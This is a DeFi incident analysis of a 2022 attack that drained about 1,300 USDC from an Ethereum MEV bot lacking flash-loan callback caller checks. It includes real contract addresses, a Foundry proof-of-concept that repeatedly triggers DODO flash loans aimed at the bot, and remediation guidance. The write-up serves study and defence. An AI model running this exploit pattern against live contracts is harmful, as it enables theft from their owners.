# MEVbot 0x28d9 — Flash Loan Callback Validation Missing Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | MEV Bot (0x28d9) |
| **Chain** | Ethereum |
| **Loss** | ~1,300 USDC |
| **Vulnerable MEV Bot** | [0x28d949Fdfb5d9ea6B604fA6FEe3D6548ea779F17](https://etherscan.io/address/0x28d949Fdfb5d9ea6B604fA6FEe3D6548ea779F17) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **USDT** | [0xdAC17F958D2ee523a2206206994597C13D831ec7](https://etherscan.io/address/0xdAC17F958D2ee523a2206206994597C13D831ec7) |
| **DODO Flash Loan** | [0x3058EF90929cb8180174D74C507176ccA6835D73](https://etherscan.io/address/0x3058EF90929cb8180174D74C507176ccA6835D73) |
| **Root Cause** | MEV Bot's callback function does not validate the caller (msg.sender), allowing arbitrary triggering to drain internal funds |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/MEVbot_0x28d9_exp.sol) |

---
## 1. Vulnerability Overview

MEV Bot 0x28d9 was an automated bot contract performing on-chain arbitrage. The bot implemented a DODO flash loan callback (`DPPFlashLoanCall` or similar function), but the callback function did not validate whether `msg.sender` was a trusted DODO contract. The attacker called a DODO flash loan for 16,777,120 USDT, specifying the MEV Bot contract address as the recipient. This triggered the MEV Bot's callback function, and the fund-handling logic within the callback allowed the attacker to drain USDC. The extraction was repeated via successive calls until the MEV Bot's USDC balance dropped below 20 USDC.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable MEV Bot - no flash loan callback caller validation
contract MEVBot {
    address public trustedDODO;

    // ❌ No msg.sender validation — anyone can trigger the callback
    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        // ❌ Missing: require(msg.sender == trustedDODO, "Invalid caller");
        // ❌ Missing: require(sender == address(this), "Invalid sender");

        // Attacker can manipulate data to execute arbitrary logic
        // Or fund-transfer logic inside the callback executes automatically
        _executeArbitrage(data);

        // Repay flash loan (MEV Bot repays on behalf of the attacker's flash loan)
        IERC20(/* token */).transfer(msg.sender, baseAmount + quoteAmount);
    }

    function _executeArbitrage(bytes calldata data) internal {
        // Internal arbitrage logic — can malfunction with manipulated data
    }
}

// ✅ Correct pattern - validate callback caller and sender
contract SafeMEVBot {
    address public immutable trustedDODO;
    bool private _executing;

    constructor(address dodo) {
        trustedDODO = dodo;
    }

    // ✅ Validate both msg.sender and sender
    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        // ✅ Only the trusted DODO contract may call this
        require(msg.sender == trustedDODO, "Invalid DODO caller");
        // ✅ The flash loan must have been initiated by this contract
        require(sender == address(this), "Invalid initiator");
        // ✅ Reentrancy guard
        require(!_executing, "Reentrant call");
        _executing = true;

        _executeArbitrage(data);

        _executing = false;
        IERC20(/* token */).transfer(msg.sender, baseAmount + quoteAmount);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**MEVbot_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: MEV Bot's callback function does not validate the caller (msg.sender), allowing arbitrary triggering to drain internal funds
    function flashLoan(uint256 arg0, uint256 arg1, address arg2, bytes arg3) external {}  // 0xd0a494e4
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Call DODO.flashLoan(baseAmount=16,777,120 USDT, assetTo=MEVBot)
    │       ← Attacker designates MEV Bot as the recipient
    │
    ├─[2] DODO triggers MEV Bot's DPPFlashLoanCall() callback
    │       ❌ No validation of msg.sender (DODO)
    │       ❌ No validation of sender (attacker address)
    │
    ├─[3] Logic inside callback executes
    │       MEV Bot's USDC balance is transferred to the attacker
    │       Or USDC is drained via manipulated flash loan handling
    │
    ├─[4] Repay DODO flash loan (using MEV Bot's balance)
    │
    ├─[5] Repeat if MEV Bot USDC balance > 20 USDC
    │       Additional flashLoan() calls drain remaining USDC
    │
    └─[6] Net profit: ~1,300 USDC
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IDPPAdvanced {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract MEVBotExploit is Test {
    IDPPAdvanced dodo    = IDPPAdvanced(0x3058EF90929cb8180174D74C507176ccA6835D73);
    IERC20       USDC    = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20       USDT    = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address      mevBot  = 0x28d949Fdfb5d9ea6B604fA6FEe3D6548ea779F17;

    function setUp() public {
        vm.createSelectFork("mainnet");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC", USDC.balanceOf(address(this)), 6);

        // [Step 1] Call DODO flash loan with MEV Bot as the recipient
        // ⚡ MEV Bot's callback function has no caller validation
        dodo.flashLoan(
            16_777_120 * 1e6,  // USDT
            0,
            mevBot,            // ← Designate MEV Bot as assetTo
            ""
        );

        // Repeat while MEV Bot USDC balance exceeds 20 USDC
        while (USDC.balanceOf(mevBot) > 20 * 1e6) {
            dodo.flashLoan(
                USDC.balanceOf(mevBot),
                0,
                mevBot,
                ""
            );
        }

        emit log_named_decimal_uint("[End] USDC", USDC.balanceOf(address(this)), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash loan callback `msg.sender`/`sender` validation missing |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Access Control Vulnerability |
| **Attack Vector** | DODO `flashLoan(assetTo=MEVBot)` → MEV Bot callback triggered → USDC drained repeatedly |
| **Precondition** | MEV Bot's flash loan callback lacks `msg.sender` and `sender` validation |
| **Impact** | ~1,300 USDC |

---
## 6. Remediation Recommendations

1. **Validate callback caller**: In flash loan callbacks (`DPPFlashLoanCall`, `pancakeCall`, `uniswapV2Call`, etc.), always verify that `msg.sender` is a trusted flash loan contract.
2. **Validate the sender parameter**: Confirm that the `sender` parameter in the flash loan callback equals this contract (`address(this)`) to prevent external parties from arbitrarily triggering the callback.
3. **Whitelist-based flash loan providers**: Maintain an allowlist of permitted flash loan provider contracts and immediately revert any callback from an address not on the list.

---
## 7. Lessons Learned

- **MEV Bots must also undergo security audits**: MEV Bots are often operated by individuals or small teams and frequently skip formal security audits. However, every contract holding funds on-chain must be held to the same security standards.
- **Flash loan callback validation is mandatory**: Omitting `msg.sender` validation in any flash loan callback — `pancakeCall`, `DPPFlashLoanCall`, `uniswapV2Call`, etc. — allows anyone to arbitrarily execute that contract's callback.
- **Small losses are still important for pattern learning**: Although the loss of ~1,300 USDC is relatively minor, this same vulnerability applied to a MEV Bot holding larger funds could cause far greater damage. The severity of a pattern should be judged by the potential impact of the vulnerability itself, not by the scale of a particular incident.